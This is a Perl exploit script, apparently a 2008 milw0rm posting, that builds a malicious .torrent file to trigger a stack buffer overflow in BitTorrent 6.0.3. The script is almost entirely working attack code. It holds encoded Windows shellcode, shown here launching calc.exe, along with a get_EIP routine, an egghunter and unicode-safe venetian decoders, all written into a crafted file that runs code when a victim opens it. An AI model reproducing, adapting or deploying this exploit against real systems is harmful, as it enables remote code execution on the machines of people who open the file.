#!/usr/bin/perl
# BitTorrent 6.0.3 .torrent File Stack Buffer Overflow Exploit
# 09/21/2008 by  k`sOSe && oVeret

use warnings;
use strict;

# If you change this(avoid \x80->\x9f unless you really know what you are doing) you must also change the length value of the decoder
my $shellcode =  
#  windows/exec CMD="C:\WINDOWS\system32\calc.exe"  
#[*] x86/alpha_mixed succeeded, final size 337                                                                                  
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41" .
"\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41" .
"\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x4b\x58\x51" .
"\x54\x43\x30\x45\x50\x45\x50\x4c\x4b\x51\x55\x47\x4c\x4c" .
"\x4b\x43\x4c\x45\x55\x44\x38\x43\x31\x4a\x4f\x4c\x4b\x50" .
"\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a\x4b\x51" .
"\x59\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x4a\x4e\x46\x51\x49" .
"\x50\x4a\x39\x4e\x4c\x4b\x34\x49\x50\x42\x54\x43\x37\x49" .
"\x51\x48\x4a\x44\x4d\x45\x51\x48\x42\x4a\x4b\x4c\x34\x47" .
"\x4b\x50\x54\x47\x54\x43\x34\x43\x45\x4d\x35\x4c\x4b\x51" .
"\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44\x4c\x50" .
"\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c\x4b\x45" .
"\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x46\x44\x45" .
"\x54\x48\x43\x51\x4f\x46\x51\x4b\x46\x45\x30\x46\x36\x45" .
"\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44\x4c\x4c" .
"\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x45\x58\x4d" .
"\x59\x4b\x48\x4d\x53\x49\x50\x42\x4a\x50\x50\x45\x38\x4a" .
"\x50\x4c\x4a\x43\x34\x51\x4f\x45\x38\x4c\x58\x4b\x4e\x4c" .
"\x4a\x44\x4e\x50\x57\x4b\x4f\x4a\x47\x50\x43\x46\x5a\x51" .
"\x4c\x46\x37\x50\x49\x50\x4e\x51\x54\x50\x4f\x50\x57\x50" .
"\x53\x51\x4c\x42\x53\x43\x49\x44\x33\x44\x34\x45\x35\x42" .
"\x4d\x50\x33\x46\x52\x51\x4c\x42\x43\x43\x51\x42\x4c\x45" .
"\x33\x46\x4e\x43\x55\x42\x58\x42\x45\x43\x30\x44\x4a\x41" .
"\x41";

$shellcode .= "\x87\x87"; # -> \x21\x20\x21\x20 -> EGG ( for english windows version )

my $ret	= "\x3f\x41"; # -> unicode friendly pop,pop,ret

# unicode friendly get_EIP (needed by the venetian decoder)
sub get_eip
{
	#0041 00          ADD BYTE PTR DS:[ECX],AL
	#5F               POP EDI
	#0041 00          ADD BYTE PTR DS:[ECX],AL
	#5F               POP EDI
	#0041 00          ADD BYTE PTR DS:[ECX],AL
	#6A 00            PUSH 0
	#58               POP EAX
	#0041 00          ADD BYTE PTR DS:[ECX],AL
	#57               PUSH EDI
	#0041 00          ADD BYTE PTR DS:[ECX],AL
	#54               PUSH ESP
	#0041 00          ADD BYTE PTR DS:[ECX],AL
	#5A               POP EDX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#40               INC EAX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#43               INC EBX
	#0042 00          ADD BYTE PTR DS:[EDX],AL
	#58               POP EAX
	#0041 00          ADD BYTE PTR DS:[ECX],AL
	"\x5f\x41\x5f\x41\x6a\x58\x41\x57\x41\x54\x41\x5a" . "\x42\x40" x 12 . "\x42\x43" . "\x42\x58\x41";
}


sub egghunter
{
	#6A01		PUSH 1
	#5E		POP ESI
	#4E		DEC ESI (=0)
	#6A72		PUSH 72				<- starts from 0x00720000
	#56		PUSH ESI
	#4C		DEC ESP
	#4C		DEC ESP
	#5E		POP ESI
	#5E		POP ESI				<- ESI == 0x00720000
	#BA21202120	/MOV EDX,20212021		<- egg
	#46		|INC ESI
	#3B16		|CMP EDX,DWORD PTR DS:[ESI]
	#75FB		\JNZ SHORT egghunter
	"\x6A\x01\x5E\x4E\x6A\x72\x56\x4C\x4C\x5E\x5E\xBA\x21\x20\x21\x20\x46\x3B\x16\x75\xFB";
}

# this will decode the unicode expanded shellcode pushing it to the stack and the execute it
sub decoder
{
	#46		INC ESI
	#6A01		PUSH 1
	#6801010155	PUSH 0x55010101
	#4C		DEC ESP
	#5B		POP EBX
	#5B		POP EBX
	#AD		/LODS DWORD PTR DS:[ESI]
	#50		|PUSH EAX
	#44		|INC ESP
	#44		|INC ESP
	#44		|INC ESP
	#4E		|DEC ESI
	#4E		|DEC ESI
	#4E		|DEC ESI
	#4E		|DEC ESI
	#4E		|DEC ESI
	#4E		|DEC ESI
	#4B		|DEC EBX
	#83FB01		|CMP EBX,1
	#75EF		\JNE SHORT decoder
	#54		PUSH ESP
	#59		POP ECX
	#4C		DEC ESP		-> realign
	#51		PUSH ECX
	#C3		RET
"\x46\x6A\x01\x68\x01\x01\x01\x55\x4C\x5B\x5B\xAD\x50\x44\x44\x44\x4E\x4E\x4E\x4E\x4E\x4E\x4B\x83\xFB\x01\x75\xEF\x54\x59\x4c\x51\xc3";
}

# venetian deccoder + venetian encoded egghunter and decoder
sub venetian_decoder
{
"\x05\x03\x01\x71\x2D\x01\x01\x71\x40\x71\xC6\x01\x71\x40\x71\x40".
"\x71\xC6\x4E\x71\x40\x71\x40\x71\xC6\x72\x71\x40\x71\x40\x71\xC6".
"\x4C\x71\x40\x71\x40\x71\xC6\x5E\x71\x40\x71\x40\x71\xC6\xBA\x71".
"\x40\x71\x40\x71\xC6\x20\x71\x40\x71\x40\x71\xC6\x20\x71\x40\x71".
"\x40\x71\xC6\x3B\x71\x40\x71\x40\x71\xC6\x75\x71\x40\x71\x40\x71".
"\xC6\x46\x71\x40\x71\x40\x71\xC6\x01\x71\x40\x71\x40\x71\xC6\x01".
"\x71\x40\x71\x40\x71\xC6\x01\x71\x40\x71\x40\x71\xC6\x4C\x71\x40".
"\x71\x40\x71\xC6\x5B\x71\x40\x71\x40\x71\xC6\x50\x71\x40\x71\x40".
"\x71\xC6\x44\x71\x40\x71\x40\x71\xC6\x4E\x71\x40\x71\x40\x71\xC6".
"\x4E\x71\x40\x71\x40\x71\xC6\x4E\x71\x40\x71\x40\x71\xC6\x4B\x71".
"\x40\x71\xFE\xFE\x40\x71\xC6\xFB\x71\x40\x71\x40\x71\xC6\x75\x71".
"\x40\x71\x40\x71\xC6\x54\x71\x40\x71\x40\x71\xC6\x4C\x71\x40\x71".
"\x40\x71\xC6\xC3\x71\x40\x71\x04\x04\x04\x04\x04\x04\x04\x04\x04".
"\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04".
"\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04".
"\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04\x04".
"\x6A\x5E\x6A\x56\x4C\x5E\x21\x21\x46\x16\xFB\x6A\x68\x01\x55\x5B".
"\xAD\x44\x44\x4E\x4E\x4E\x81\x01\xEF\x59\x51";
}

my $stack_buffer	= $ret x 192 . get_eip() . venetian_decoder();

open(HANDLE, "> torrent.torrent") || die "Error!\n\n";
print HANDLE	"d8:announce17:http://qwerty.qwe7:comment" 	. 
		length($shellcode) .":" 			. 
		$shellcode .
		"10:created by" 				.
		length($stack_buffer) . ":"			.
		$stack_buffer					.
		"13:creation datei1218555046e8:encoding10:iso-8859-14:infod6:lengthi1e4:name6:bu.txt12:piece lengthi65536e6:pieces20:".	
		"\x86\xf7\xe4\x37\xfa\xa5\xa7\xfc\xe1\x5d\x1d\xdc\xb9\xea\xea\xea\x37\x76\x67\xb8\x65\x65\x0a";
close (HANDLE);

# milw0rm.com [2008-10-19]
